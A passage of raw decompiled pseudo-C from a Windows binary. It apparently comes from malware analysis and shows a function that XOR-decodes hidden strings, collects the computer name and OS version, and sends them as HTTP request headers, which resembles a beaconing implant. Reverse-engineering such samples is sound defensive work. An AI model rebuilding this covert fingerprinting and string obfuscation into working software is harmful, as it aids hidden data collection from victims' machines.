uchar var_32ah;\n    uchar var_329h;\n    uint var_328h;\n    uchar var_324h;\n    uchar var_323h;\n    uchar var_322h;\n    uchar var_321h;\n    uchar var_320h;\n    uchar var_31fh;\n    uchar var_31eh;\n    uchar var_31dh;\n    uchar var_31ch;\n    uchar var_31bh;\n    uchar var_31ah;\n    uchar var_319h;\n    uchar var_318h;\n    uchar var_317h;\n    uchar var_316h;\n    uchar var_315h;\n    uchar var_314h;\n    uchar var_313h;\n    uchar var_312h;\n    uchar var_311h;\n    uchar var_310h;\n    uchar var_30fh;\n    uchar var_30eh;\n    uchar var_30dh;\n    uchar var_30ch;\n    uchar var_30bh;\n    uchar var_30ah;\n    uchar var_309h;\n    uchar var_308h;\n    uchar var_307h;\n    uchar var_306h;\n    uchar var_305h;\n    uchar var_304h;\n    uchar var_303h;\n    uchar var_302h;\n    uchar var_301h;\n    uchar var_300h;\n    uchar var_2ffh;\n    uchar var_2feh;\n    uchar var_2fdh;\n    uint8_t var_2fch [4];\n    uchar var_2f8h;\n    uchar var_2f7h;\n    uchar var_2f6h;\n    uchar var_2f5h;\n    uchar var_2f4h;\n    uchar var_2f3h;\n    uchar var_2f2h;\n    uchar var_2f1h;\n    uchar var_2f0h;\n    uchar var_2efh;\n    uchar var_2eeh;\n    uchar var_2edh;\n    uchar var_2ech;\n    uchar var_2ebh;\n    uchar var_2eah;\n    uchar var_2e9h;\n    uchar var_2e8h;\n    uchar var_2e7h;\n    uchar var_2e6h;\n    uchar var_2e5h;\n    uchar var_2e4h;\n    uchar var_2e3h;\n    uchar var_2e2h;\n    uchar var_2e1h;\n    uchar var_2e0h;\n    uchar var_2dfh;\n    uchar var_2deh;\n    uchar var_2ddh;\n    uchar var_2dch;\n    uchar var_2dbh;\n    uchar var_2dah;\n    uchar var_2d9h;\n    uchar var_2d8h;\n    uchar var_2d7h;\n    uchar var_2d6h;\n    uchar var_2d5h;\n    uchar var_2d4h;\n    uchar var_2d3h;\n    uchar var_2d2h;\n    uchar var_2d1h;\n    uint8_t var_2d0h [4];\n    uchar var_2cch;\n    uchar var_2cbh;\n    uchar var_2cah;\n    uchar var_2c9h;\n    uchar var_2c8h;\n    uchar var_2c7h;\n    uchar var_2c6h;\n    uchar var_2c5h;\n    uchar var_2c4h;\n    uchar var_2c3h;\n    uchar var_2c2h;\n    uchar var_2c1h;\n    uchar var_2c0h;\n    uchar var_2bfh;\n    uchar var_2beh;\n    uchar var_2bdh;\n    uchar var_2bch;\n    uchar var_2bbh;\n    uchar var_2bah;\n    uchar var_2b9h;\n    uchar var_2b8h;\n    uchar var_2b7h;\n    uchar var_2b6h;\n    uchar var_2b5h;\n    uchar var_2b4h;\n    uchar var_2b3h;\n    uchar var_2b2h;\n    uchar var_2b1h;\n    uchar var_2b0h;\n    uchar var_2afh;\n    uchar var_2aeh;\n    uchar var_2adh;\n    uchar var_2ach;\n    uchar var_2abh;\n    uchar var_2aah;\n    uchar var_2a9h;\n    uchar var_2a8h;\n    uchar var_2a7h;\n    uchar var_2a6h;\n    uchar var_2a5h;\n    uint var_2a4h;\n    uchar var_2a0h;\n    uchar var_29fh;\n    uchar var_29eh;\n    uchar var_29dh;\n    uchar var_29ch;\n    uchar var_29bh;\n    uchar var_29ah;\n    uchar var_299h;\n    uchar var_298h;\n    uchar var_297h;\n    uchar var_296h;\n    uchar var_295h;\n    uchar var_294h;\n    uchar var_293h;\n    uchar var_292h;\n    uchar var_291h;\n    uchar var_290h;\n    uchar var_28fh;\n    uchar var_28eh;\n    uchar var_28dh;\n    uchar var_28ch;\n    uchar var_28bh;\n    uchar var_28ah;\n    uchar var_289h;\n    uchar var_288h;\n    uchar var_287h;\n    uchar var_286h;\n    uchar var_285h;\n    uchar var_284h;\n    uchar var_283h;\n    uchar var_282h;\n    uchar var_281h;\n    uchar var_280h;\n    uchar var_27fh;\n    uchar var_27eh;\n    uchar var_27dh;\n    uchar var_27ch;\n    uchar var_27bh;\n    uint var_278h;\n    uchar var_274h;\n    uchar var_273h;\n    uchar var_272h;\n    uchar var_271h;\n    uchar var_270h;\n    uchar var_26fh;\n    uchar var_26eh;\n    uchar var_26dh;\n    uchar var_26ch;\n    uchar var_26bh;\n    uchar var_26ah;\n    uchar var_269h;\n    uchar var_268h;\n    uchar var_267h;\n    uchar var_266h;\n    uchar var_265h;\n    uchar var_264h;\n    uchar var_263h;\n    uchar var_262h;\n    uchar var_261h;\n    uchar var_260h;\n    uchar var_25fh;\n    uchar var_25eh;\n    uchar var_25dh;\n    uchar var_25ch;\n    uchar var_25bh;\n    uchar var_25ah;\n    uchar var_259h;\n    uchar var_258h;\n    uchar var_257h;\n    uchar var_256h;\n    uchar var_255h;\n    uchar var_254h;\n    uchar var_253h;\n    uchar var_252h;\n    uchar var_251h;\n    uint8_t var_250h [4];\n    uchar var_24ch;\n    uchar var_24bh;\n    uchar var_24ah;\n    uchar var_249h;\n    uchar var_248h;\n    uchar var_247h;\n    uchar var_246h;\n    uchar var_245h;\n    uchar var_244h;\n    uchar var_243h;\n    uchar var_242h;\n    uchar var_241h;\n    uchar var_240h;\n    uchar var_23fh;\n    uchar var_23eh;\n    uchar var_23dh;\n    uchar var_23ch;\n    uchar var_23bh;\n    uchar var_23ah;\n    uchar var_239h;\n    uchar var_238h;\n    uchar var_237h;\n    uchar var_236h;\n    uchar var_235h;\n    uchar var_234h;\n    uchar var_233h;\n    uchar var_232h;\n    uchar var_231h;\n    uchar var_230h;\n    uchar var_22fh;\n    uchar var_22eh;\n    uchar var_22dh;\n    uchar var_22ch;\n    uchar var_22bh;\n    uchar var_22ah;\n    uchar var_229h;\n    uint var_228h;\n    uchar var_224h;\n    uchar var_223h;\n    uchar var_222h;\n    uchar var_221h;\n    uchar var_220h;\n    uchar var_21fh;\n    uchar var_21eh;\n    uchar var_21dh;\n    uchar var_21ch;\n    uchar var_21bh;\n    uchar var_21ah;\n    uchar var_219h;\n    uchar var_218h;\n    uchar var_217h;\n    uchar var_216h;\n    uchar var_215h;\n    uchar var_214h;\n    uchar var_213h;\n    uchar var_212h;\n    uchar var_211h;\n    uchar var_210h;\n    uchar var_20fh;\n    uchar var_20eh;\n    uchar var_20dh;\n    uchar var_20ch;\n    uchar var_20bh;\n    uchar var_20ah;\n    uchar var_209h;\n    uchar var_208h;\n    uchar var_207h;\n    uchar var_206h;\n    uchar var_205h;\n    uchar var_204h;\n    uchar var_203h;\n    uint8_t var_200h [4];\n    uchar var_1fch;\n    uchar var_1fbh;\n    uchar var_1fah;\n    uchar var_1f9h;\n    uchar var_1f8h;\n    uchar var_1f7h;\n    uchar var_1f6h;\n    uchar var_1f5h;\n    uchar var_1f4h;\n    uchar var_1f3h;\n    uchar var_1f2h;\n    uchar var_1f1h;\n    uchar var_1f0h;\n    uchar var_1efh;\n    uchar var_1eeh;\n    uchar var_1edh;\n    uchar var_1ech;\n    uchar var_1ebh;\n    uchar var_1eah;\n    uchar var_1e9h;\n    uchar var_1e8h;\n    uchar var_1e7h;\n    uchar var_1e6h;\n    uchar var_1e5h;\n    uchar var_1e4h;\n    uchar var_1e3h;\n    uchar var_1e2h;\n    uchar var_1e1h;\n    uchar var_1e0h;\n    uchar var_1dfh;\n    uchar var_1deh;\n    uchar var_1ddh;\n    uchar var_1dch;\n    uchar var_1dbh;\n    uint8_t var_1d8h [4];\n    uchar var_1d4h;\n    uchar var_1d3h;\n    uchar var_1d2h;\n    uchar var_1d1h;\n    uchar var_1d0h;\n    uchar var_1cfh;\n    uchar var_1ceh;\n    uchar var_1cdh;\n    uchar var_1cch;\n    uchar var_1cbh;\n    uchar var_1cah;\n    uchar var_1c9h;\n    uchar var_1c8h;\n    uchar var_1c7h;\n    uchar var_1c6h;\n    uchar var_1c5h;\n    uchar var_1c4h;\n    uchar var_1c3h;\n    uchar var_1c2h;\n    uchar var_1c1h;\n    uchar var_1c0h;\n    uchar var_1bfh;\n    uchar var_1beh;\n    uchar var_1bdh;\n    uchar var_1bch;\n    uchar var_1bbh;\n    uchar var_1bah;\n    uchar var_1b9h;\n    uchar var_1b8h;\n    uchar var_1b7h;\n    uchar var_1b6h;\n    uchar var_1b5h;\n    uchar var_1b4h;\n    uchar var_1b3h;\n    uint var_1b0h;\n    uchar var_1ach;\n    uchar var_1abh;\n    uchar var_1aah;\n    uchar var_1a9h;\n    uchar var_1a8h;\n    uchar var_1a7h;\n    uchar var_1a6h;\n    uchar var_1a5h;\n    uchar var_1a4h;\n    uchar var_1a3h;\n    uchar var_1a2h;\n    uchar var_1a1h;\n    uchar var_1a0h;\n    uchar var_19fh;\n    uchar var_19eh;\n    uchar var_19dh;\n    uchar var_19ch;\n    uchar var_19bh;\n    uchar var_19ah;\n    uchar var_199h;\n    uchar var_198h;\n    uchar var_197h;\n    uchar var_196h;\n    uchar var_195h;\n    uchar var_194h;\n    uchar var_193h;\n    uchar var_192h;\n    uchar var_191h;\n    uint8_t var_190h [4];\n    uchar var_18ch;\n    uchar var_18bh;\n    uchar var_18ah;\n    uchar var_189h;\n    uchar var_188h;\n    uchar var_187h;\n    uchar var_186h;\n    uchar var_185h;\n    uchar var_184h;\n    uchar var_183h;\n    uchar var_182h;\n    uchar var_181h;\n    uchar var_180h;\n    uchar var_17fh;\n    uchar var_17eh;\n    uchar var_17dh;\n    uchar var_17ch;\n    uchar var_17bh;\n    uchar var_17ah;\n    uchar var_179h;\n    uchar var_178h;\n    uchar var_177h;\n    uchar var_176h;\n    uchar var_175h;\n    uchar var_174h;\n    uchar var_173h;\n    uint8_t var_170h [4];\n    uchar var_16ch;\n    uchar var_16bh;\n    uchar var_16ah;\n    uchar var_169h;\n    uchar var_168h;\n    uchar var_167h;\n    uchar var_166h;\n    uchar var_165h;\n    uchar var_164h;\n    uchar var_163h;\n    uchar var_162h;\n    uchar var_161h;\n    uchar var_160h;\n    uchar var_15fh;\n    uint var_15ch;\n    uchar var_158h;\n    uchar var_157h;\n    uchar var_156h;\n    uchar var_155h;\n    uchar var_154h;\n    uchar var_153h;\n    uchar var_152h;\n    uchar var_151h;\n    uint var_150h;\n    uchar var_14ch;\n    uchar var_14bh;\n    uchar var_14ah;\n    uchar var_149h;\n    uchar var_148h;\n    uchar var_147h;\n    uchar var_146h;\n    uchar var_145h;\n    uint8_t var_144h [4];\n    uchar var_140h;\n    uchar var_13fh;\n    uchar var_13eh;\n    uchar var_13dh;\n    uchar var_13ch;\n    uchar var_13bh;\n    uint var_138h;\n    uchar var_134h;\n    uchar var_133h;\n    uint var_130h;\n    uchar var_12ch;\n    uchar var_12bh;\n    uint var_128h;\n    uchar var_124h;\n    uchar var_123h;\n    uint var_120h;\n    uchar var_11ch;\n    uchar var_11bh;\n    uint8_t var_118h [4];\n    uchar var_114h;\n    uchar var_113h;\n    uint8_t var_110h [4];\n    uchar var_10ch;\n    uchar var_10bh;\n    uint var_108h;\n    uchar var_104h;\n    uchar var_103h;\n    uint var_100h;\n    uchar var_fch;\n    uchar var_fbh;\n    uint var_f8h;\n    uchar var_f4h;\n    uchar var_f3h;\n    uint8_t var_f0h [4];\n    uchar var_ech;\n    uchar var_ebh;\n    uint8_t var_e8h [4];\n    uchar var_e4h;\n    uchar var_e3h;\n    uint var_e0h;\n    uchar var_dch;\n    uchar var_dbh;\n    uint var_d8h;\n    uchar var_d4h;\n    uchar var_d3h;\n    uint var_d0h;\n    uchar var_cch;\n    uint var_c8h;\n    uchar var_c4h;\n    uint var_c0h;\n    uchar var_bch;\n    uint var_b8h;\n    uchar var_b4h;\n    uint var_b0h;\n    uchar var_ach;\n    uint var_a8h;\n    uchar var_a4h;\n    uint var_a0h;\n    uchar var_9ch;\n    uint var_98h;\n    uchar var_94h;\n    uint var_90h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    int32_t lpBuffer;\n    int32_t var_6ch;\n    int32_t var_68h;\n    uint var_64h;\n    int32_t var_60h;\n    int32_t var_5ch;\n    int32_t var_58h;\n    int32_t var_54h;\n    int32_t var_50h;\n    int32_t var_4ch;\n    int32_t var_48h;\n    int32_t var_44h;\n    int32_t var_40h;\n    int32_t var_3ch;\n    int32_t var_38h;\n    int32_t var_34h;\n    int32_t var_30h;\n    int32_t var_2ch;\n    int32_t var_28h;\n    int32_t var_24h;\n    int32_t var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    code *var_8h;\n    int32_t lpString;\n    \n    var_68h = 0;\n    var_6ch = 0;\n    var_ch = 0;\n    puVar3 = &lpVersionInformation;\n    for (iVar2 = 0x11c; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    lpVersionInformation = 0x11c;\n    var_8h = _sym.imp.WINHTTP.dll_WinHttpAddRequestHeaders;\n    if (arg_ch != 0) {\n        var_8h = _sym.imp.WININET.dll_HttpAddRequestHeadersW;\n    }\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x410);\n    lpString = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    if (lpString != 0) {\n        var_1b0h._0_1_ = 0x1d;\n        var_1b0h._1_1_ = 0x71;\n        var_1b0h._2_1_ = 0x44;\n        var_1b0h._3_1_ = 0x41;\n        var_1ach = 4;\n        var_1abh = 0x45;\n        var_1aah = 0x18;\n        var_1a9h = 0x69;\n        var_1a8h = 0x2d;\n        var_1a7h = 0x42;\n        var_1a6h = 0x20;\n        var_1a5h = 0x71;\n        var_1a4h = 0x44;\n        var_1a3h = 0x41;\n        var_1a2h = 0xc;\n        var_1a1h = 0x45;\n        var_1a0h = 0x10;\n        var_19fh = 0x69;\n        var_19eh = 0x2c;\n        var_19dh = 0x42;\n        var_19ch = 0x20;\n        var_19bh = 0x71;\n        var_19ah = 0x53;\n        var_199h = 0x41;\n        var_198h = 0x62;\n        var_197h = 0x45;\n        var_196h = 0x54;\n        var_195h = 0x69;\n        var_194h = 0x32;\n        var_193h = 0x42;\n        var_192h = 0x45;\n        var_191h = 0x71;\n        var_d0h._0_1_ = 0x45;\n        var_d0h._1_1_ = 0x71;\n        var_d0h._2_1_ = 0x69;\n        var_d0h._3_1_ = 0x41;\n        var_cch = 0x42;\n        fcn.004012a0(0x40);\n        for (var_10h = 0; var_10h < 0x20; var_10h = var_10h + 1) {\n            fcn.00401280(var_10h, *(&var_1b0h + var_10h) ^ *(&var_d0h + var_10h % 5));\n        }\n        uVar1 = fcn.00401270(*0x436b44);\n        (*_sym.imp.USER32.dll_wsprintfW)(lpString, uVar1);\n        uVar1 = (*_sym.imp.KERNEL32.dll_lstrlenW)(lpString, 0x10000000);\n        (*var_8h)(arg_8h, lpString, uVar1);\n        iVar2 = fcn.0040baf0(lpString);\n        if (iVar2 != 0) {\n            uVar1 = (*_sym.imp.KERNEL32.dll_lstrlenW)(lpString, 0x10000000);\n            (*var_8h)(arg_8h, lpString, uVar1);\n        }\n        iVar2 = fcn.00422e40(&var_4cch, &var_4c4h, &var_4c0h);\n        if (iVar2 != 0) {\n            var_1d8h[0] = 9;\n            var_1d8h[1] = 0x43;\n            var_1d8h[2] = 0x1e;\n            var_1d8h[3] = 0x41;\n            var_1d4h = 0x21;\n            var_1d3h = 0x53;\n            var_1d2h = 0x23;\n            var_1d1h = 0x43;\n            var_1d0h = 0x5c;\n            var_1cfh = 0x41;\n            var_1ceh = 9;\n            var_1cdh = 0x53;\n            var_1cch = 0x28;\n            var_1cbh = 0x43;\n            var_1cah = 0x1e;\n            var_1c9h = 0x41;\n            var_1c8h = 0x22;\n            var_1c7h = 0x53;\n            var_1c6h = 0x34;\n            var_1c5h = 0x43;\n            var_1c4h = 0x41;\n            var_1c3h = 0x41;\n            var_1c2h = 7;\n            var_1c1h = 0x53;\n            var_1c0h = 0x34;\n            var_1bfh = 0x43;\n            var_1beh = 0x41;\n            var_1bdh = 0x41;\n            var_1bch = 0x4b;\n            var_1bbh = 0x53;\n            var_1bah = 0x71;\n            var_1b9h = 0x43;\n            var_1b8h = 0x16;\n            var_1b7h = 0x41;\n            var_1b6h = 2;\n            var_1b5h = 0x53;\n            var_1b4h = 0x51;\n            var_1b3h = 0x43;\n            var_f0h[0] = 0x51;\n            var_f0h[1] = 0x43;\n            var_f0h[2] = 0x33;\n            var_f0h[3] = 0x41;\n            var_ech = 0x71;\n            var_ebh = 0x53;\n            fcn.004012a0(0x4c);\n            for (var_14h = 0; var_14h < 0x26; var_14h = var_14h + 1) {\n                fcn.00401280(var_14h, var_1d8h[var_14h] ^ var_f0h[var_14h % 6]);\n            }\n            var_2a4h._0_1_ = 0x3f;\n            var_2a4h._1_1_ = 0x4c;\n            var_2a4h._2_1_ = 0x59;\n            var_2a4h._3_1_ = 0x31;\n            var_2a0h = 0x69;\n            var_29fh = 0x30;\n            var_29eh = 0x15;\n            var_29dh = 0x4c;\n            var_29ch = 0x1b;\n            var_29bh = 0x31;\n            var_29ah = 0x41;\n            var_299h = 0x30;\n            var_298h = 0x1e;\n            var_297h = 0x4c;\n            var_296h = 0x59;\n            var_295h = 0x31;\n            var_294h = 0x76;\n            var_293h = 0x30;\n            var_292h = 0x11;\n            var_291h = 0x4c;\n            var_290h = 0x11;\n            var_28fh = 0x31;\n            var_28eh = 0x4b;\n            var_28dh = 0x30;\n            var_28ch = 0x15;\n            var_28bh = 0x4c;\n            var_28ah = 0x1d;\n            var_289h = 0x31;\n            var_288h = 0x5d;\n            var_287h = 0x30;\n            var_286h = 2;\n            var_285h = 0x4c;\n            var_284h = 0x4e;\n            var_283h = 0x31;\n            var_282h = 0x19;\n            var_281h = 0x30;\n            var_280h = 0x42;\n            var_27fh = 0x4c;\n            var_27eh = 7;\n            var_27dh = 0x31;\n            var_27ch = 0x39;\n            var_27bh = 0x30;\n            var_e8h[0] = 0x67;\n            var_e8h[1] = 0x4c;\n            var_e8h[2] = 0x74;\n            var_e8h[3] = 0x31;\n            var_e4h = 0x39;\n            var_e3h = 0x30;\n            fcn.004012a0(0x54);\n            for (var_18h = 0; var_18h < 0x2a; var_18h = var_18h + 1) {\n                fcn.00401280(var_18h, *(&var_2a4h + var_18h) ^ var_e8h[var_18h % 6]);\n            }\n            var_2d0h[0] = 0xc;\n            var_2d0h[1] = 0x32;\n            var_2d0h[2] = 0x5d;\n            var_2d0h[3] = 0x78;\n            var_2cch = 0x21;\n            var_2cbh = 0x54;\n            var_2cah = 0x40;\n            var_2c9h = 0x70;\n            var_2c8h = 0x17;\n            var_2c7h = 0x71;\n            var_2c6h = 0x2c;\n            var_2c5h = 0x32;\n            var_2c4h = 9;\n            var_2c3h = 0x78;\n            var_2c2h = 0x5c;\n            var_2c1h = 0x54;\n            var_2c0h = 0x71;\n            var_2bfh = 0x70;\n            var_2beh = 0x17;\n            var_2bdh = 0x71;\n            var_2bch = 0x3a;\n            var_2bbh = 0x32;\n            var_2bah = 0x16;\n            var_2b9h = 0x78;\n            var_2b8h = 0x18;\n            var_2b7h = 0x54;\n            var_2b6h = 0x55;\n            var_2b5h = 0x70;\n            var_2b4h = 0x2d;\n            var_2b3h = 0x71;\n            var_2b2h = 0x26;\n            var_2b1h = 0x32;\n            var_2b0h = 0x1c;\n            var_2afh = 0x78;\n            var_2aeh = 0x4b;\n            var_2adh = 0x54;\n            var_2ach = 0x12;\n            var_2abh = 0x70;\n            var_2aah = 0x5d;\n            var_2a9h = 0x71;\n            var_2a8h = 0x27;\n            var_2a7h = 0x32;\n            var_2a6h = 0x70;\n            var_2a5h = 0x78;\n            var_c8h._0_1_ = 0x54;\n            var_c8h._1_1_ = 0x32;\n            var_c8h._2_1_ = 0x70;\n            var_c8h._3_1_ = 0x78;\n            var_c4h = 0x71;\n            fcn.004012a0(0x58);\n            for (var_1ch = 0; var_1ch < 0x2c; var_1ch = var_1ch + 1) {\n                fcn.00401280(var_1ch, var_2d0h[var_1ch] ^ *(&var_c8h + var_1ch % 5));\n            }\n            if (var_4cch != 0) {\n                uVar1 = fcn.00401270(var_4cch);\n                (*_sym.imp.USER32.dll_wsprintfW)(lpString, uVar1);\n                uVar1 = (*_sym.imp.KERNEL32.dll_lstrlenW)(lpString, 0x10000000);\n                (*var_8h)(arg_8h, lpString, uVar1);\n                uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_4cch);\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n            }\n            if (var_4c4h != 0) {\n                uVar1 = fcn.00401270(var_4c4h);\n                (*_sym.imp.USER32.dll_wsprintfW)(lpString, uVar1);\n                uVar1 = (*_sym.imp.KERNEL32.dll_lstrlenW)(lpString, 0x10000000);\n                (*var_8h)(arg_8h, lpString, uVar1);\n                uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_4c4h);\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n            }\n            if (var_4c0h != 0) {\n                uVar1 = fcn.00401270(var_4c0h);\n                (*_sym.imp.USER32.dll_wsprintfW)(lpString, uVar1);\n                uVar1 = (*_sym.imp.KERNEL32.dll_lstrlenW)(lpString, 0x10000000);\n                (*var_8h)(arg_8h, lpString, uVar1);\n                uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_4c0h);\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n            }\n            fcn.004012d0();\n            fcn.004012d0();\n            fcn.004012d0();\n        }\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x208);\n        lpBuffer = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n        nSize = 0x104;\n        if (lpBuffer != 0) {\n            iVar2 = (*_sym.imp.KERNEL32.dll_GetComputerNameW)(lpBuffer, &nSize);\n            if (iVar2 != 0) {\n                var_200h[0] = 9;\n                var_200h[1] = 0x4f;\n                var_200h[2] = 0x67;\n                var_200h[3] = 0x72;\n                var_1fch = 0x21;\n                var_1fbh = 0x4f;\n                var_1fah = 0x3e;\n                var_1f9h = 0x4f;\n                var_1f8h = 0x27;\n                var_1f7h = 0x72;\n                var_1f6h = 0x12;\n                var_1f5h = 0x4f;\n                var_1f4h = 0x24;\n                var_1f3h = 0x4f;\n                var_1f2h = 0x3e;\n                var_1f1h = 0x72;\n                var_1f0h = 7;\n                var_1efh = 0x4f;\n                var_1eeh = 0x23;\n                var_1edh = 0x4f;\n                var_1ech = 4;\n                var_1ebh = 0x72;\n                var_1eah = 3;\n                var_1e9h = 0x4f;\n                var_1e8h = 0x3c;\n                var_1e7h = 0x4f;\n                var_1e6h = 0x2f;\n                var_1e5h = 0x72;\n                var_1e4h = 0x58;\n                var_1e3h = 0x4f;\n                var_1e2h = 0x71;\n                var_1e1h = 0x4f;\n                var_1e0h = 0x6f;\n                var_1dfh = 0x72;\n                var_1deh = 0x11;\n                var_1ddh = 0x4f;\n                var_1dch = 0x51;\n                var_1dbh = 0x4f;\n                var_e0h._0_1_ = 0x51;\n                var_e0h._1_1_ = 0x4f;\n                var_e0h._2_1_ = 0x4a;\n                var_e0h._3_1_ = 0x72;\n                var_dch = 0x62;\n                var_dbh = 0x4f;\n                fcn.004012a0(0x4c);\n                for (var_20h = 0; var_20h < 0x26; var_20h = var_20h + 1) {\n                    fcn.00401280(var_20h, var_200h[var_20h] ^ *(&var_e0h + var_20h % 6));\n                }\n                uVar1 = fcn.00401270(lpBuffer);\n                (*_sym.imp.USER32.dll_wsprintfW)(lpString, uVar1);\n                uVar1 = (*_sym.imp.KERNEL32.dll_lstrlenW)(lpString, 0x10000000);\n                (*var_8h)(arg_8h, lpString, uVar1);\n                fcn.004012d0();\n            }\n            uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, lpBuffer);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n        }\n        iVar2 = (*_sym.imp.KERNEL32.dll_GetVersionExW)(&lpVersionInformation);\n        if (iVar2 != 0) {\n            var_43ch[0] = 0x2f;\n            var_43ch[1] = 0x54;\n            var_43ch[2] = 0x69;\n            var_43ch[3] = 0x51;\n            var_438h = 0x2b;\n            var_437h = 0x4a;\n            var_436h = 0x24;\n            var_435h = 0x54;\n            var_434h = 0x12;\n            var_433h = 0x51;\n            var_432h = 1;\n            var_431h = 0x4a;\n            var_430h = 5;\n            var_42fh = 0x54;\n            var_42eh = 0x37;\n            var_42dh = 0x51;\n            var_42ch = 0xd;\n            var_42bh = 0x4a;\n            var_42ah = 0x18;\n            var_429h = 0x54;\n            var_428h = 0x2a;\n            var_427h = 0x51;\n            var_426h = 0x5e;\n            var_425h = 0x4a;\n            var_424h = 0x57;\n            var_423h = 0x54;\n            var_422h = 0x61;\n            var_421h = 0x51;\n            var_420h = 0;\n            var_41fh = 0x4a;\n            var_41eh = 0x59;\n            var_41dh = 0x54;\n            var_41ch = 0x61;\n            var_41bh = 0x51;\n            var_41ah = 0;\n            var_419h = 0x4a;\n            var_418h = 0x59;\n            var_417h = 0x54;\n            var_416h = 0x61;\n            var_415h = 0x51;\n            var_414h = 0;\n            var_413h = 0x4a;\n            var_412h = 0xb;\n            var_411h = 0x54;\n            var_410h = 0x61;\n            var_40fh = 0x51;\n            var_40eh = 0x17;\n            var_40dh = 0x4a;\n            var_40ch = 0x57;\n            var_40bh = 0x54;\n            var_40ah = 0x61;\n            var_409h = 0x51;\n            var_408h = 0;\n            var_407h = 0x4a;\n            var_406h = 0x59;\n            var_405h = 0x54;\n            var_404h = 0x61;\n            var_403h = 0x51;\n            var_402h = 0;\n            var_401h = 0x4a;\n            var_400h = 0xb;\n            var_3ffh = 0x54;\n            var_3feh = 0x61;\n            var_3fdh = 0x51;\n            var_3fch = 0;\n            var_3fbh = 0x4a;\n            var_3fah = 0xb;\n            var_3f9h = 0x54;\n            var_3f8h = 0x74;\n            var_3f7h = 0x51;\n            var_3f6h = 0x1c;\n            var_3f5h = 0x4a;\n            var_3f4h = 0x52;\n            var_3f3h = 0x54;\n            var_3f2h = 0x34;\n            var_3f1h = 0x51;\n            var_3f0h = 100;\n            var_3efh = 0x4a;\n            var_d8h._0_1_ = 0x77;\n            var_d8h._1_1_ = 0x54;\n            var_d8h._2_1_ = 0x44;\n            var_d8h._3_1_ = 0x51;\n            var_d4h = 100;\n            var_d3h = 0x4a;\n            fcn.004012a0(0x9c);\n            for (var_24h = 0; var_24h < 0x4e; var_24h = var_24h + 1) {\n                fcn.00401280(var_24h, var_43ch[var_24h] ^ *(&var_d8h + var_24h % 6));\n            }\n            uVar1 = fcn.00401270(var_5ech, var_5e8h, var_5e4h, &var_5dch, var_4dch, var_4dah, var_4d8h._2_1_, var_4d8h);\n            (*_sym.imp.USER32.dll_wsprintfW)(lpString, uVar1);\n            uVar1 = (*_sym.imp.KERNEL32.dll_lstrlenW)(lpString, 0x10000000);\n            (*var_8h)(arg_8h, lpString, uVar1);\n            fcn.004012d0();\n        }\n        var_190h[0] = 0x10;\n        var_190h[1] = 0x36;\n        var_190h[2] = 0x6c;\n        var_190h[3] = 0x53;\n        var_18ch = 0x25;\n        var_18bh = 0x4f;\n        var_18ah = 0x2d;\n        var_189h = 0x36;\n        var_188h = 0x2f;\n        var_187h = 0x53;\n        var_186h = 0x17;\n        var_185h = 0x4f;\n        var_184h = 0x27;\n        var_183h = 0x36;\n        var_182h = 0x33;\n        var_181h = 0x53;\n        var_180h = 0x3a;\n        var_17fh = 0x4f;\n        var_17eh = 0x2c;\n        var_17dh = 0x36;\n        var_17ch = 0x7b;\n        var_17bh = 0x53;\n        var_17ah = 0x53;\n        var_179h = 0x4f;\n        var_178h = 0x6d;\n        var_177h = 0x36;\n        var_176h = 0x25;\n        var_175h = 0x53;\n        var_174h = 0x73;\n        var_173h = 0x4f;\n        var_f8h._0_1_ = 0x48;\n        var_f8h._1_1_ = 0x36;\n        var_f8h._2_1_ = 0x41;\n        var_f8h._3_1_ = 0x53;\n        var_f4h = 0x73;\n        var_f3h = 0x4f;\n        fcn.004012a0(0x3c);\n        for (var_28h = 0; var_28h < 0x1e; var_28h = var_28h + 1) {\n            fcn.00401280(var_28h, var_190h[var_28h] ^ *(&var_f8h + var_28h % 6));\n        }\n        uVar1 = fcn.00401270(*0x436648);\n        (*_sym.imp.USER32.dll_wsprintfW)(lpString, uVar1);\n        uVar1 = (*_sym.imp.KERNEL32.dll_lstrlenW)(lpString, 0x10000000);\n        (*var_8h)(arg_8h, lpString, uVar1);\n        fcn.004012d0();\n        iVar2 = fcn.0041e0f0(&var_68h, &var_6ch);\n        if (((iVar2 == 0) && (var_68h != 0)) && (var_6ch != 0)) {\n            fcn.0041e800(var_6ch, var_68h, &var_ch);\n            if (var_ch != 0) {\n                var_64h = 0;\n                var_150h._0_1_ = 0x37;\n                var_150h._1_1_ = 100;\n                var_150h._2_1_ = 4;\n                var_150h._3_1_ = 0x51;\n                var_14ch = 0x56;\n                var_14bh = 0x50;\n                var_14ah = 0x17;\n                var_149h = 0x71;\n                var_148h = 0x25;\n                var_147h = 0x33;\n                var_146h = 0x50;\n                var_145h = 100;\n                var_c0h._0_1_ = 0x50;\n                var_c0h._1_1_ = 100;\n                var_c0h._2_1_ = 0x71;\n                var_c0h._3_1_ = 0x51;\n                var_bch = 0x33;\n                fcn.004012a0(0x18);\n                for (var_2ch = 0; var_2ch < 0xc; var_2ch = var_2ch + 1) {\n                    fcn.00401280(var_2ch, *(&var_150h + var_2ch) ^ *(&var_c0h + var_2ch % 5));\n                }\n                var_144h[0] = 0x18;\n                var_144h[1] = 0x53;\n                var_144h[2] = 0x36;\n                var_144h[3] = 100;\n                var_140h = 10;\n                var_13fh = 0x6d;\n                var_13eh = 0x21;\n                var_13dh = 0x45;\n           